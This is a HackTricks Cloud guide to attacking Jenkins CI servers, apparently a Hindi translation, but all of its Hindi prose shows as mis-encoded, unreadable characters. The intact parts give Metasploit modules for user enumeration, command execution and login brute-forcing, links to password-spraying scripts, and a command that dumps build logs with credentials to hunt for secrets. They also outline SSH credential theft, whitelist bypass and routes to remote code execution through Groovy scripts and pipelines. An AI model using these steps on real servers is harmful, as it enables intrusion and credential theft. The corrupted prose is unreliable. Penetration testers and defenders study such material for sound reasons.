# Jenkins рд╕реБрд░рдХреНрд╖рд╛

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

Jenkins рд▓рдЧрднрдЧ **рдХрд┐рд╕реА рднреА** рднрд╛рд╖рд╛ рдФрд░ рд╕реНрд░реЛрдд рдХреЛрдб рд░рд┐рдкреЙрдЬрд┐рдЯрд░реАрдЬ рдХреЗ рд╕рдВрдпреЛрдЬрди рдХреЗ рд▓рд┐рдП **рдирд┐рд░рдВрддрд░ рдПрдХреАрдХрд░рдг** рдпрд╛ **рдирд┐рд░рдВрддрд░ рд╡рд┐рддрд░рдг** (CI/CD) рд╡рд╛рддрд╛рд╡рд░рдг рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХрд╛ рдПрдХ рд╕рд░рд▓ рддрд░реАрдХрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рд╕рд╛рде рд╣реА рдкрд╛рдЗрдкрд▓рд╛рдЗрдиреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдиреНрдп рдирд┐рдпрдорд┐рдд рд╡рд┐рдХрд╛рд╕ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЬрдмрдХрд┐ Jenkins рд╡реНрдпрдХреНрддрд┐рдЧрдд рдЪрд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдмрдирд╛рдиреЗ рдХреА **рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЛ рд╕рдорд╛рдкреНрдд рдирд╣реАрдВ рдХрд░рддрд╛**, рдпрд╣ рдЖрдкрдХреЛ рдЕрдкрдиреЗ рдкреВрд░реЗ рдмрд┐рд▓реНрдб, рдкрд░реАрдХреНрд╖рдг, рдФрд░ рддреИрдирд╛рддреА рдЙрдкрдХрд░рдгреЛрдВ рдХреА рд╢реНрд░реГрдВрдЦрд▓рд╛ рдХреЛ рдПрдХреАрдХреГрдд рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддреЗрдЬ рдФрд░ рдЕрдзрд┐рдХ рдордЬрдмреВрдд рддрд░реАрдХрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдЖрдк рд╕реНрд╡рдпрдВ рдЖрд╕рд╛рдиреА рд╕реЗ рдирд╣реАрдВ рдмрдирд╛ рд╕рдХрддреЗред\
рдкрд░рд┐рднрд╛рд╖рд╛ [рдпрд╣рд╛рдБ](https://www.infoworld.com/article/3239666/what-is-jenkins-the-ci-server-explained.html) рд╕реЗ рд▓реА рдЧрдИ рд╣реИред

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## рдмрд┐рдирд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд╕реВрдЪреАрдХрд░рдг

рдмрд┐рдирд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рджрд┐рд▓рдЪрд╕реНрдк Jenkins рдкреГрд╖реНрдареЛрдВ рдХреА рдЦреЛрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬреИрд╕реЗ (_/people_ рдпрд╛ _/asynchPeople_, рдпрд╣ рд╡рд░реНрддрдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рд╕реВрдЪреА рджрд┐рдЦрд╛рддрд╛ рд╣реИ) рдЖрдк рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдмрд┐рдирд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЗ рдЖрджреЗрд╢ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
msf> use auxiliary/scanner/http/jenkins_command
```
рдмрд┐рдирд╛ рдкреНрд░рдорд╛рдг-рдкрддреНрд░ рдХреЗ рдЖрдк _**/asynchPeople/**_ рдкрде рдпрд╛ _**/securityRealm/user/admin/search/index?q=**_ рдореЗрдВ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо** рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдк _**/oops**_ рдпрд╛ _**/error**_ рдкрде рд╕реЗ Jenkins рд╕рдВрд╕реНрдХрд░рдг рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

![](<../../.gitbook/assets/image (48).png>)

### рдЬреНрдЮрд╛рдд рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## рд▓реЙрдЧрд┐рди

рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА рдореЗрдВ рдЖрдк **Jenkins рдХреЗ рдЕрдВрджрд░ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреЗ рд╕рднреА рддрд░реАрдХреЗ** рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### рдкрдВрдЬреАрдХрд░рдг

рдЖрдк Jenkins рдЙрджрд╛рд╣рд░рдг рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЖрдкрдХреЛ рдПрдХ рдЦрд╛рддрд╛ рдмрдирд╛рдиреЗ рдФрд░ рдЙрд╕рдХреЗ рдЕрдВрджрд░ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреА **рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред рдЗрддрдирд╛ рд╣реА рд╕рд░рд▓ред**

### **SSO рд▓реЙрдЧрд┐рди**

рдпрджрд┐ **SSO** **рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛**/**рдкреНрд▓рдЧрдЗрдиреНрд╕** рдореМрдЬреВрдж рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рдПрдХ рдкрд░реАрдХреНрд╖рдг рдЦрд╛рддреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ **рд▓реЙрдЧ-рдЗрди** рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ рдкрд░реАрдХреНрд╖рдг **Github/Bitbucket рдЦрд╛рддрд╛**). рдпрд╣рд╛рдБ рд╕реЗ рдЪрд╛рд▓ [**рдпрд╣рд╛рдБ**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

### рдмреНрд░реВрдЯрдлреЛрд░реНрд╕

**Jekins** рдореЗрдВ рдХреЛрдИ рднреА **рдкрд╛рд╕рд╡рд░реНрдб рдиреАрддрд┐** рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо **рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдирд┐рд╡рд╛рд░рдг** рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдЖрдкрдХреЛ рд╣рдореЗрд╢рд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ **рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕** рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдХреНрдпреЛрдВрдХрд┐ рд╕рдВрднрд╡рддрдГ **рдХрдордЬреЛрд░ рдкрд╛рд╕рд╡рд░реНрдб** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ (рдпрд╣рд╛рдБ рддрдХ рдХрд┐ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдХреЛ рдкрд╛рд╕рд╡рд░реНрдб** рдХреЗ рд░реВрдк рдореЗрдВ рдпрд╛ **рдЙрд▓рдЯреЗ** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдХреЛ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд░реВрдк рдореЗрдВ).
```
msf> use auxiliary/scanner/http/jenkins_login
```
### рдкрд╛рд╕рд╡рд░реНрдб рд╕реНрдкреНрд░реЗрдЗрдВрдЧ

[рдЗрд╕ рдкрд╛рдпрдерди рд╕реНрдХреНрд░рд┐рдкреНрдЯ](https://github.com/gquere/pwn_jenkins/blob/master/password_spraying/jenkins_password_spraying.py) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдпрд╛ [рдЗрд╕ рдкреЙрд╡рд░рд╢реЗрд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ](https://github.com/chryzsh/JenkinsPasswordSpray) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред

### IP рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯрд┐рдВрдЧ рдмрд╛рдпрдкрд╛рд╕

рдХрдИ рд╕рдВрдЧрдарди **SaaS-рдЖрдзрд╛рд░рд┐рдд рд╕реЛрд░реНрд╕ рдХрдВрдЯреНрд░реЛрд▓ рдореИрдиреЗрдЬрдореЗрдВрдЯ (SCM) рд╕рд┐рд╕реНрдЯрдореНрд╕** (рдЬреИрд╕реЗ GitHub рдпрд╛ GitLab) рдХреЛ **рдЖрдВрддрд░рд┐рдХ**, рд╕реНрд╡-рд╣реЛрд╕реНрдЯреЗрдб **CI** рд╕рдорд╛рдзрд╛рди (рдЬреИрд╕реЗ Jenkins, TeamCity) рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝рддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдпреЗ CI рд╕рд┐рд╕реНрдЯрдореНрд╕ **SaaS рд╕реЛрд░реНрд╕** рдХрдВрдЯреНрд░реЛрд▓ рд╡рд┐рдХреНрд░реЗрддрд╛рдУрдВ рд╕реЗ **рд╡реЗрдмрд╣реБрдХ рдЗрд╡реЗрдВрдЯреНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХреЗрдВ**, рд╕рд┐рд░реНрдл рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдЬреЙрдмреНрд╕ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

рдЗрд╕рд▓рд┐рдП, рд╕рдВрдЧрдарди **SCM** рдХреЗ **IP** рд░реЗрдВрдЬреЗрд╕ рдХреЛ **рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯ** рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╡реЗ **рдЖрдВрддрд░рд┐рдХ** CI рд╕рд┐рд╕реНрдЯрдо рддрдХ **рд╡реЗрдмрд╣реБрдХреНрд╕** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╣реБрдБрдЪ рд╕рдХреЗрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдХреЛрдИ рднреА** Github рдпрд╛ Gitlab рдореЗрдВ рдПрдХ **рдЕрдХрд╛рдЙрдВрдЯ** рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ **рд╡реЗрдмрд╣реБрдХ рдЯреНрд░рд┐рдЧрд░** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдХрд┐ **рдЖрдВрддрд░рд┐рдХ CI рд╕рд┐рд╕реНрдЯрдо** рдХреЛ рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИред

{% content-ref url="scm-ip-whitelisting-bypass.md" %}
[scm-ip-whitelisting-bypass.md](scm-ip-whitelisting-bypass.md)
{% endcontent-ref %}

## рдЖрдВрддрд░рд┐рдХ Jenkins рджреБрд░реБрдкрдпреЛрдЧ

рдЗрди рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ рд╣рдо рдорд╛рди рд░рд╣реЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ Jenkins рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдорд╛рдиреНрдп рдЕрдХрд╛рдЙрдВрдЯ рд╣реИред

{% hint style="warning" %}
Jenkins рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП **Authorization** рддрдВрддреНрд░ рдФрд░ рд╕рдордЭреМрддрд╛ рдХрд┐рдП рдЧрдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдЕрдиреБрдорддрд┐ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЖрдк **рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣рдорд▓реЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдирд╣реАрдВред**
{% endhint %}

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА рджреЗрдЦреЗрдВ:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рд╕реВрдЪреА рдмрдирд╛рдирд╛

рдпрджрд┐ рдЖрдкрдиреЗ Jenkins рддрдХ рдкрд╣реБрдБрдЪ рдкреНрд░рд╛рдкреНрдд рдХреА рд╣реИ рддреЛ рдЖрдк [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/) рдореЗрдВ рдЕрдиреНрдп рдкрдВрдЬреАрдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рд╕реВрдЪреА рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред

### рдмрд┐рд▓реНрдбреНрд╕ рдХреЛ рдбрдВрдк рдХрд░рдирд╛ рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП

рдмрд┐рд▓реНрдб рдХрдВрд╕реЛрд▓ рдЖрдЙрдЯрдкреБрдЯреНрд╕ рдФрд░ рдмрд┐рд▓реНрдб рдкрд░реНрдпрд╛рд╡рд░рдг рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреЛ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [рдЗрд╕ рд╕реНрдХреНрд░рд┐рдкреНрдЯ](https://github.com/gquere/pwn_jenkins/blob/master/dump_builds/jenkins_dump_builds.py) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдЖрдк рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдЦреЛрдЬ рд╕рдХреЗрдВред
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **SSH рдкреНрд░рдорд╛рдг-рдкрддреНрд░ рдЪреБрд░рд╛рдирд╛**

рдпрджрд┐ рд╕рдордЭреМрддрд╛ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ **рдирдП Jenkins рдиреЛрдб рдХреЛ рдмрдирд╛рдиреЗ/рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рдЕрдзрд┐рдХрд╛рд░ рд╣реИрдВ** рдФрд░ SSH рдкреНрд░рдорд╛рдг-рдкрддреНрд░ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЕрдиреНрдп рдиреЛрдбреНрд╕ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реИрдВ, рддреЛ рд╡рд╣ **рдЙрди рдкреНрд░рдорд╛рдг-рдкрддреНрд░реЛрдВ рдХреЛ рдЪреБрд░рд╛ рд╕рдХрддрд╛ рд╣реИ** рдПрдХ рдиреЛрдб рдмрдирд╛рдХрд░/рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдФрд░ **рдПрдХ рд╣реЛрд╕реНрдЯ рд╕реЗрдЯ рдХрд░рдХреЗ рдЬреЛ рдкреНрд░рдорд╛рдг-рдкрддреНрд░реЛрдВ рдХреЛ рд░рд┐рдХреЙрд░реНрдб рдХрд░реЗрдЧрд╛** рдмрд┐рдирд╛ рд╣реЛрд╕реНрдЯ рдХреА рдХреБрдВрдЬреА рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд┐рдП:

![](<../../.gitbook/assets/image (56).png>)

рдЖрдкрдХреЛ рдЖрдорддреМрд░ рдкрд░ Jenkins ssh рдкреНрд░рдорд╛рдг-рдкрддреНрд░ рдПрдХ **рд╡реИрд╢реНрд╡рд┐рдХ рдкреНрд░рджрд╛рддрд╛** (`/credentials/`) рдореЗрдВ рдорд┐рд▓реЗрдВрдЧреЗ, рдЗрд╕рд▓рд┐рдП рдЖрдк рдЙрдиреНрд╣реЗрдВ рдбрдВрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рдЖрдк рдХрд┐рд╕реА рдЕрдиреНрдп рдЧреБрдкреНрдд рдХреЛ рдбрдВрдк рдХрд░реЗрдВрдЧреЗред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рдЧреБрдкреНрдд рдбрдВрдкрд┐рдВрдЧ рдЕрдиреБрднрд╛рдЧ**](./#dumping-secrets) рджреЗрдЦреЗрдВред

### **Jenkins рдореЗрдВ RCE**

Jenkins рд╕рд░реНрд╡рд░ рдореЗрдВ **рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛** рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рд╕рднреА **рдЧреБрдкреНрдд** рдФрд░ **env рдЪрд░** рдХреЛ рд▓реАрдХ рдХрд░рдиреЗ рдФрд░ рд╕рдорд╛рди рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╕реНрдерд┐рдд рдЕрдиреНрдп рдорд╢реАрдиреЛрдВ рдХрд╛ **рд╢реЛрд╖рдг рдХрд░рдиреЗ** рдпрд╛ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ **рдХреНрд▓рд╛рдЙрдб рдкреНрд░рдорд╛рдг-рдкрддреНрд░ рдПрдХрддреНрд░ рдХрд░рдиреЗ** рдХрд╛ рдЕрд╡рд╕рд░ рджреЗрддрд╛ рд╣реИред

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, Jenkins **тАЬрд╕рд┐рд╕реНрдЯрдо рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рд╛рдПрдЧрд╛тАЭ рдмрд┐рд▓реНрдбреНрд╕**ред рджреВрд╕рд░реЗ рд╢рдмреНрджреЛрдВ рдореЗрдВ, рд╡реЗ рдЗрд╕реЗ **рд╕рд░реНрд╡рд╢рдХреНрддрд┐рдорд╛рди SYSTEM рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЛ рд╕реМрдВрдкрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдмрд┐рд▓реНрдб рдХреЗ рджреМрд░рд╛рди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдХреЛрдИ рднреА рдХрд╛рд░реНрдп рдЬреЛ рдЪрд╛рд╣реЗ рд╡рд╣ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИред

### **RCE рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдмрдирд╛рдирд╛/рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛**

рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдмрдирд╛рдирд╛/рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ Jenkins рд╕рд░реНрд╡рд░ рдкрд░ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рд╣реИ:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **RCE Groovy рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛**

рдЖрдк Groovy рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдХреЗ рднреА RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рдирдпрд╛ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдмрдирд╛рдиреЗ рд╕реЗ рдЕрдзрд┐рдХ рдЪреБрдкрдХреЗ рд╕реЗ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### RCE рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдмрдирд╛рдирд╛/рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛

рдЖрдк **рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдмрдирд╛рдХрд░/рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рднреА RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## рдкрд╛рдЗрдкрд▓рд╛рдЗрди рд╢реЛрд╖рдг

рдкрд╛рдЗрдкрд▓рд╛рдЗрдиреЛрдВ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдЕрднреА рднреА Jenkins рддрдХ рдкрд╣реБрдБрдЪ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

### рдмрд┐рд▓реНрдб рдкрд╛рдЗрдкрд▓рд╛рдЗрдиреНрд╕

**рдкрд╛рдЗрдкрд▓рд╛рдЗрдиреНрд╕** рдХрд╛ рдЙрдкрдпреЛрдЧ рдкреНрд░реЛрдЬреЗрдХреНрдЯреНрд╕ рдореЗрдВ **рдмрд┐рд▓реНрдб рддрдВрддреНрд░ рдХреЗ рд░реВрдк рдореЗрдВ рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**, рдЙрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдпрд╣ рдПрдХ **рдлрд╝рд╛рдЗрд▓ рдХреЛ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдХреЗ рдЕрдВрджрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ** рдЬрд┐рд╕рдореЗрдВ рдкрд╛рдЗрдкрд▓рд╛рдЗрди рд╕рд┐рдВрдЯреИрдХреНрд╕ рд╣реЛрдЧрд╛ред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `/Jenkinsfile` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:

![](<../../.gitbook/assets/image (14) (1) (1).png>)

рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдЕрдиреНрдп рд╕реНрдерд╛рдиреЛрдВ рдкрд░ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдпрд╛ рдЬрд╛рдП** (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рд░рд┐рдкреЙрдЬрд┐рдЯрд░реАрдЬрд╝ рдореЗрдВ) рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА **рдкрд╣реБрдБрдЪ** рдФрд░ рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдкрд╣реБрдБрдЪ рдХреЛ **рдЕрд▓рдЧ рдХрд░рдиреЗ** рдХреЗ рдЙрджреНрджреЗрд╢реНрдп рд╕реЗред

рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкрд╛рд╕ рдЙрд╕ рдлрд╝рд╛рдЗрд▓ рдкрд░ **рд▓рд┐рдЦрдиреЗ рдХреА рдкрд╣реБрдБрдЪ рд╣реИ** рддреЛ рд╡рд╣ рдЗрд╕реЗ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЛ рдЯреНрд░рд┐рдЧрд░** рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдмрд┐рдирд╛ Jenkins рддрдХ рдкрд╣реБрдБрдЪ рдХреЗред\
